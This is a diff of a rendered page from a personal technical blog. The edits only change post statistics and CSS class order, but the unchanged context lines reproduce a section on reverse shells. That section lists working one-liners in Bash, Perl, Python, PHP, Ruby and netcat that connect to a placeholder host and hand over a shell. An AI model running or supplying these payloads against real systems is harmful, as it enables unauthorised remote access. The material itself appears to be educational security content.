@@ -60,8 +60,8 @@
             <h1><a href="https://jackmckew.dev">Jack McKew's Blog</a></h1>
 
             <p>Engineer | Software Developer | Data Scientist</p>            <p>Number of Posts: 91</p>
-            <p>Number of Words: 68,609</p>
-            <p>Number of Lines of Code 4,824</p>
+            <p>Number of Words: 68,613</p>
+            <p>Number of Lines of Code 4,825</p>
             <form class="navbar-search" action="/search.html" role="search">
                 <input type="text" name="q" id="tipue_search_input" placeholder="Search..">
             </form>
@@ -273,27 +273,27 @@
 </ol>
 <p>Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by <code>[HOST_IP]</code> and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.</p>
 <h4 id="bash">Bash</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/<span class="o">[</span>HOST_IP<span class="o">]</span>/8080 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/<span class="o">[</span>HOST_IP<span class="o">]</span>/8080 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h4 id="perl">PERL</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h4 id="python">Python</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h4 id="php">PHP</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="x">php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="x">php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h4 id="ruby">Ruby</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h4 id="netcat">Netcat</h4>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>nc -e /bin/sh <span class="o">[</span>HOST_IP<span class="o">]</span> <span class="m">8080</span>
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>nc -e /bin/sh <span class="o">[</span>HOST_IP<span class="o">]</span> <span class="m">8080</span>
 </code></pre></div>
 </td></tr></tbody></table>
 <h3 id="local-file-inclusion">Local File Inclusion</h3>
@@ -303,7 +303,7 @@
 <ol>
 <li>create a php file with the following:</li>
 </ol>
-<table class="highlighttable table table-striped"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+<table class="table-striped highlighttable table"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
 2
 3
 4
